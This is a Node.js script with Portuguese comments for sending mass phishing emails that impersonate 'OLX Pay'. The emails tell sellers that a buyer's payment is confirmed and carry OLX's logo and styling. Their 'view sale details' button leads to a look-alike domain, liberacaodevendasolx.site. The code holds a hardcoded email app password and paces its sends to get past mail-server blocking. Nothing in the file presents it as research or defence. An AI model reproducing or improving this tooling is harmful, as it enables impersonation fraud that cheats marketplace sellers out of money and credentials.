const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

// Configuração do transporte SMTP
const transporter = nodemailer.createTransport({
  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
  auth: {
    user: "siteolx@siteolx.com", // seu email
    pass: "wsko fobj ibpd kppo", // sua senha ou senha de app
  },
});

/**
 * Função para enviar e-mail
 * @param {string} destinatario - e-mail do destinatário
 * @param {string} assunto - assunto do e-mail
 * @param {string} htmlConteudo - conteúdo em HTML do e-mail
 */
async function enviarEmail(destinatario, assunto, htmlConteudo) {
  const mailOptions = {
    from: '"Equipe OLX Pay" <siteolx@siteolx.com>', // remetente
    to: destinatario,
    subject: assunto,
    html: htmlConteudo,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado para ${destinatario}: ${info.messageId}`);
    return true;
  } catch (error) {
    console.error(`❌ Erro ao enviar email para ${destinatario}:`, error);
    return false;
  }
}

/**
 * Função para carregar dados de vendas do arquivo JSON
 * @returns {Array} Array com dados de vendas
 */
function carregarDadosVendas() {
  try {
    const caminhoArquivo = path.join(__dirname, "../data/vendas.json");
    const dados = fs.readFileSync(caminhoArquivo, "utf8");
    return JSON.parse(dados);
  } catch (error) {
    console.error("Erro ao carregar dados de vendas:", error);
    return [];
  }
}

/**
 * Função para enviar e-mails em massa para uma lista de destinatários
 * @param {Array} listaEmails - lista de e-mails destinatários
 * @param {string} codigoProduto - (opcional) código específico do produto
 * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
 */
async function enviarEmMassa(
  listaEmails,
  codigoProduto = null,
  assuntoPersonalizado = null
) {
  // Carregar dados de vendas
  const dadosVendas = carregarDadosVendas();

  if (dadosVendas.length === 0) {
    console.error(
      "Não foi possível carregar dados de produtos para o envio em massa"
    );
    return;
  }

  // Se não foi especificado um código, usa o primeiro produto na lista
  const produto = codigoProduto
    ? dadosVendas.find((p) => p.codigo === codigoProduto)
    : dadosVendas[0];

  if (!produto) {
    console.error(`Produto com código ${codigoProduto} não encontrado`);
    return;
  }

  // Informações para o e-mail
  const codigoVenda = produto.codigo;
  const nomeProduto = produto.produto;
  const valorProduto = produto.valor;
  const nomeComprador = produto.comprador;

  const linkProduto = `https://liberacaodevendasolx.site/pag/?id=${codigoVenda}`;

  // Contadores para estatísticas
  let enviados = 0;
  let falhas = 0;

  // Assunto do e-mail
  const assunto =
    assuntoPersonalizado ||
    `OLX Pay - Confirmação de Pagamento para ${nomeProduto}`;

  console.log(
    `Iniciando envio em massa para ${listaEmails.length} destinatários...`
  );
  console.log(`Produto: ${nomeProduto} (${codigoVenda})`);

  // Enviar para cada e-mail da lista
  for (const email of listaEmails) {
    // Template do e-mail com link personalizado
    const mensagemHTML = `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 24px; border: 1px solid #e0e0e0; border-radius: 10px; background-color: #ffffff;">
  <div style="text-align: center; margin-bottom: 20px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX Logo" style="height: 50px;" />
  </div>

  <h2 style="color: #7c00ff; font-size: 20px;">📨 Pagamento confirmado com sucesso</h2>

  <p style="font-size: 15px; color: #333;">Olá,</p>

  <p style="font-size: 15px; color: #333;">
    O pagamento referente ao seu anúncio <strong>"${nomeProduto}"</strong> foi <strong>confirmado com sucesso</strong> em nossa plataforma.
  </p>

  <p style="font-size: 15px; color: #333;">
    O comprador <strong>${nomeComprador}</strong> está pronto para realizar a <strong>retirada no local</strong>, conforme combinado.
  </p>

  <div style="background-color: #f6f6f6; padding: 15px; border-radius: 8px; margin: 20px 0;">
    <p style="font-size: 14px; color: #555; margin: 0;">
      🔒 Esta transação está protegida pela <strong>OLX Pay</strong>. O valor será liberado automaticamente assim que a retirada for confirmada pelo sistema.
    </p>
  </div>

  <div style="text-align: center; margin: 30px 0;">
    <a href="${linkProduto}"
       style="background-color: #7c00ff; color: #fff; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-size: 15px;">
       Ver detalhes da venda
    </a>
  </div>

  <p style="font-size: 14px; color: #333;">
    Em caso de dúvidas, acesse a <a href="https://ajuda.olx.com.br" style="color: #7c00ff; text-decoration: none;">Central de Ajuda</a> da OLX.
  </p>

  <p style="font-size: 14px; color: #555; margin-top: 30px;">
    Atenciosamente,<br>
    <strong>Equipe OLX Pay</strong>
  </p>
</div>`;

    // Enviar e-mail
    const resultado = await enviarEmail(email, assunto, mensagemHTML);

    if (resultado) {
      enviados++;
    } else {
      falhas++;
    }

    // Pequeno delay para evitar bloqueios do servidor de e-mail
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }

  console.log(`
  ✅ Envio em massa concluído:
  - E-mails enviados com sucesso: ${enviados}
  - Falhas no envio: ${falhas}
  - Total de tentativas: ${listaEmails.length}
  `);
}

// Exportar funções
module.exports = {
  enviarEmail,
  enviarEmMassa,
  carregarDadosVendas,
};

// Descomentar para testar
// teste();
// testarEnvioEmMassa();
